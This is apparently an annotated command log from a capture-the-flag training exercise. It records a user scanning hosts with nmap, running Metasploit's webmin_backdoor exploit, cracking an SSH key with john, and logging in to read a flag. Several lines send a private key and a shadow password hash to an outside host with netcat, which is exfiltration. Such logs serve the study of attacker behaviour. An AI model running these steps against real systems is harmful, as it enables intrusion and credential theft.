User 80 start time 1594797822 end 1594802268
PADDING
PADDING
PADDING
INPUT|80--0|A0 |1594797822|80|nmap -A 172.18.1.5|OUTPUT
INPUT|80--1|A0 |1594798112|80|nmap -A -p 1-65536|OUTPUT
INPUT|80--2|A0 |1594798129|80|nmap -A -p 1-65536 172.18.1.5|OUTPUT
INPUT|80--3|A0 |1594798136|80|nmap -A -p 1-65535 172.18.1.5|OUTPUT
INPUT|80--4|A2 M2 |1594798572|80|msfconsole|OUTPUT
INPUT|80--5|A3 M3 |1594798615|80|search webmin|OUTPUT
INPUT|80--6|A4 M4 |1594798646|80|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|80--7|U|1594798658|80|options|OUTPUT
INPUT|80--8|A6 M6 |1594798679|80|set RHOST 172.18.1.5|OUTPUT
INPUT|80--9|A6 M6 |1594798705|80|set RHOSTS 172.18.1.5|OUTPUT
INPUT|80--10|U|1594798731|80|ip a|OUTPUT
INPUT|80--11|A6 M6 |1594798754|80|set LHOST 10.1.135.83|OUTPUT
INPUT|80--12|A0 |1594799351|80|nmap -A 10.1.17.4|OUTPUT
INPUT|80--13|U|1594799501|80|vim key|OUTPUT
INPUT|80--14|U|1594799576|80|ssh2john|OUTPUT
INPUT|80--15|U|1594799617|80|john key|OUTPUT
INPUT|80--16|U|1594799737|80|cat key | nc hxx.cz 8080|OUTPUT
INPUT|80--17|U|1594799830|80|locate *2john|OUTPUT
INPUT|80--18|U|1594800013|80|/usr/share/john/ssh2john.py key > key.hash|OUTPUT
INPUT|80--19|U|1594800021|80|john key.hash|OUTPUT
INPUT|80--20|U|1594800059|80|cat key.hash|OUTPUT
INPUT|80--21|A8 M8 |1594800220|80|run|OUTPUT
INPUT|80--22|U|1594800690|80|sessions -l|OUTPUT
INPUT|80--23|U|1594800699|80|sessions -h|OUTPUT
INPUT|80--24|U|1594800711|80|sessions -u 2|OUTPUT
INPUT|80--25|U|1594800717|80|sessions -l|OUTPUT
INPUT|80--26|U|1594800960|80|echo 'eve:$6$eDIUpTqNub/vHNdW$1OxDFqCfsUBdhYWqY6f2P37WcGUznmP7BCEmEADlIkvxkpjzOy3zv3MJTxAC53a1oPtoBpvzRksNCzO4pppiy.:18451:0:99999:7:::' |nc hxx.cz 8080|OUTPUT
INPUT|80--27|U|1594800987|80|echo 'eve:$6$eDIUpTqNub/vHNdW$1OxDFqCfsUBdhYWqY6f2P37WcGUznmP7BCEmEADlIkvxkpjzOy3zv3MJTxAC53a1oPtoBpvzRksNCzO4pppiy.:18451:0:99999:7:::' | nc hxx.cz 8080|OUTPUT
INPUT|80--28|U|1594801285|80|sessions -i 3|OUTPUT
INPUT|80--29|A8 M8 |1594801296|80|run|OUTPUT
INPUT|80--30|U|1594801301|80|sessions -l|OUTPUT
INPUT|80--31|U|1594801315|80|sessions -U 4|OUTPUT
INPUT|80--32|U|1594801326|80|sessions -u 4|OUTPUT
INPUT|80--33|U|1594801715|80|ls|OUTPUT
INPUT|80--34|U|1594801757|80|./ssh2john.py key > key2.hash|OUTPUT
INPUT|80--35|U|1594801766|80|john key2.hash|OUTPUT
INPUT|80--36|U|1594801795|80|locate *ockyou*|OUTPUT
INPUT|80--37|U|1594801814|80|john --wordlist=/usr/share/wordlists/rockyou.txt key2.hash|OUTPUT
INPUT|80--38|U|1594801917|80|ssh -h|OUTPUT
INPUT|80--39|A16 M16 |1594801965|80|ssh -i key eve@10.1.17.4|OUTPUT
INPUT|80--40|U|1594801982|80|chmod 600 key|OUTPUT
INPUT|80--41|A16 M16 |1594801984|80|ssh -i key eve@10.1.17.4|OUTPUT
INPUT|80--42|A16 M16 |1594802011|80|ssh -i key eve@10.1.17.4|OUTPUT
INPUT|80--43|U|1594802077|80|ls|OUTPUT
INPUT|80--44|U|1594802080|80|cd top-secret/|OUTPUT
INPUT|80--45|U|1594802081|80|ls|OUTPUT
INPUT|80--46|A17 M17 |1594802083|80|cat flag.txt|OUTPUT
INPUT|80--47|U|1594802268|80|cat /usr/share/wordlists/rockyou.txt |wc|OUTPUT
